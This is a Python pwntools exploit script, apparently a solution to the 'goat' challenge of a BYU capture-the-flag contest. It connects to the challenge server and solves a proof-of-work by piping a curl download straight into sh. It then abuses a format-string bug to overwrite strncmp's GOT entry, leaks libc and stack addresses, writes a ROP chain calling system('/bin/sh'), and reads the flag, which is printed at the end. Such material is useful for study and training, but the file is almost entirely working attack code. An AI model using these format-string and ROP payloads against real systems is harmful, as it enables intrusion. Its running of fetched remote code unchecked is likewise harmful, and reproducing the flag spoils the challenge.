from pwn import *
import subprocess

exe = ELF("./goat_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p_s = lambda data: p.send(data)
p_sa = lambda msg, data: p.sendafter(msg, data)
p_sl = lambda data: p.sendline(data)
p_sla = lambda msg, data: p.sendlineafter(msg, data)
p_recvut = lambda msg: p.recvuntil(msg)
debug = lambda : gdb.attach(p, gdbscript = script)


curl_command = "curl -sSfL https://pwn.red/pow | sh -s "
p = remote("goat.chal.cyberjousting.com", 1349)
p.recvuntil(b"curl -sSfL https://pwn.red/pow | sh -s ")
a = p.recvuntil(b"\n", drop=True)
curl_command += a.decode()
process = subprocess.Popen(curl_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
stdout, stderr = process.communicate()
output = stdout.decode('utf-8')
errors = stderr.decode('utf-8')
p.sendafter(b"solution: ", output.encode())

script = '''
b *0x401278
b *0x4012B0
b *0x4012E9
'''

def overwrite(addr, val):
	l = []
	l.append([val & 0xffff, 0])
	val = val >> 16
	l.append([val & 0xffff, 2])
	val = val >> 16
	l.append([val & 0xffff, 4])
	l = sorted(l, key = lambda x: x[0])

	payload = f'%{0x10000 - 24}c%11$hn'.encode()
	payload = payload.ljust(0x18, b"A") + p64(addr + 6)
	p.sendlineafter(b"name? ", payload)

	payload = f'%{l[0][0] - 24}c%11$hn'.encode()
	payload = payload.ljust(0x18, b"A") + p64(addr + l[0][1])
	p.sendlineafter(b"name? ", payload)

	payload = f'%{l[1][0] - 24}c%11$hn'.encode()
	payload = payload.ljust(0x18, b"A") + p64(addr + l[1][1])
	p.sendlineafter(b"name? ", payload)

	payload = f'%{l[2][0] - 24}c%11$hn'.encode()
	payload = payload.ljust(0x18, b"A") + p64(addr + l[2][1])
	p.sendlineafter(b"name? ", payload)

#p = process("./goat_patched")
#p = gdb.debug("./goat_patched", gdbscript = script)

strncmp_got = exe.got['strncmp']
payload = f"%{0x11f0 - 24}c%11$hn".encode()
payload = payload.ljust(0x18, b"A") + p64(strncmp_got)
p.sendlineafter(b"name? ", payload)

#debug()

payload = f"!!!%56$p!!!%57$p".encode()
p.sendlineafter(b"name? ", payload)
p.recvuntil(b"!!!")
rbp = int(p.recv(14), 16) - 0x170
p.recvuntil(b"!!!")
libc_base = int(p.recv(14), 16) - 0x2a1ca

p.sendline(b"yes")

#debug()

system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
pop_rdi = libc_base + 0x000000000010f75b
ret = pop_rdi + 1

overwrite(rbp + 0x8, pop_rdi)
overwrite(rbp + 0x10, binsh)
overwrite(rbp + 0x18, ret)
overwrite(rbp + 0x20, system)

#debug()

print(hex(rbp), hex(libc_base))
strncmp_got = exe.got['strncmp']
payload = f"%{0x1355 - 24}c%11$hn".encode()
payload = payload.ljust(0x18, b"A") + p64(strncmp_got)
p.sendlineafter(b"name? ", payload)

p.sendline(b"cat flag.txt")

p.interactive()
#byuctf{n0w_y0u're_the_g0at!}